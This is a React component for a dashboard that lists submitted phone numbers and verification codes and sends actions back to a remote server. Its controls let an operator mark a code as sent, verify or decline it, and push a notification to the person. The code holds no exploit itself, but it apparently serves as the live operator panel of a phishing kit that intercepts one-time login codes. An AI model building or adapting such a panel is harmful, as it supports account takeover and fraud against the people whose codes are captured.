import { useEffect, useState } from "react";
import { toast } from "react-toastify";
import "./DashboardTable.css";


function DashboardRow({ row, setLoading }: { row: Record<string, string | number>, setLoading: React.Dispatch<React.SetStateAction<boolean>> }) {
  function codeSent() {
    fetch("https://demooooo.onrender.com/codeSent", {
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id: row.userid })
    }).then(() => {
      toast.success("Code sent successfully")
      setLoading((prev) => !prev)
    })
  }
  console.log(row.userid)
  async function deleteRow() {
    setLoading(true)
    await fetch("https://demooooo.onrender.com/deleteRow", {
      method: "delete",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id: row.userid })
    })
    toast.success("Row deleted successfully")
    setLoading(false)
  }


  function deleteCode() {
    fetch("https://demooooo.onrender.com/deleteCode", {
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id: row.userid })
    }).then(() => {
      toast.success("Code Declined successfully")
      setLoading((prev) => !prev)
    })
  }
  function verify() {
    fetch("https://demooooo.onrender.com/verified", {
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id: row.userid })
    }).then(() => {
      toast.success("Code verified successfully")
      setLoading((prev) => !prev)
    })
  }


  const [notification, setNotification] = useState("")

  useEffect(() => {
    setNotification(String(row.notification))
  }, [row.notification])

  function sendNotification() {
    fetch("https://demooooo.onrender.com/notification", {
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id: row.userid, notification: notification })
    }).then(() => {
      toast.success("Notification sent successfully")
      setLoading((prev) => !prev)
    })
  }
  return (
    <tr>
      <td>{row.phone_number}</td>
      <td>{row.country_code}</td>
      <td>{row.country}</td>
      <td>{row.code}</td>
      <td>
        <button className="code-sent-btn" onClick={() => codeSent()}>Code Sent</button>
        <button className="verify-btn" onClick={() => verify()}>Verify</button>
        <button className="code-incorrect-btn" onClick={() => deleteCode()}>Decline Code</button>
        <button className="code-incorrect-btn" onClick={() => deleteRow()}>Delete Row</button>
      </td>
      <td className="notification-cell">
        <input
          value={notification}
          onChange={(e) => setNotification(e.target.value)}
          type="text"
          placeholder="Notification"
          className="notification-input"
        />
        <button className="send-btn" onClick={() => sendNotification()}>Send</button>
      </td>
    </tr>
  )
}

const DashboardTable = () => {
  const [data, setData] = useState([{}])
  const [loading, setLoading] = useState(false)
  useEffect(() => {
    fetch("https://demooooo.onrender.com/getAllPhoneNumberInfo", {
      method: "get",
      headers: { "Content-Type": "application/json" }
    }).then(response => response.json()).then((data) => {
      setData(data)
      setLoading(false)
    })
  }, [loading])


  return (
    <div style={{ position: "absolute", left: 0, backgroundColor: "black", top: 0, width: "100%", height: "100vh", overflowY: "scroll" }}>
      <div className="dashboard-table">
        <div className="refresh" onClick={() => setLoading(() => true)}>
          Refresh
        </div>
        <table>
          <thead>
            <tr>
              <th>Phone Number</th>
              <th>Country Code</th>
              <th>Country</th>
              <th>Code</th>
              <th>Actions</th>
              <th>Notification</th>
            </tr>
          </thead>
          <tbody>
            {data.map((row, key) => {
              return (
                <DashboardRow row={row} key={key} setLoading={setLoading} />
              )
            })}
          </tbody>
        </table>
      </div>
    </div>

  );
};

export default DashboardTable;
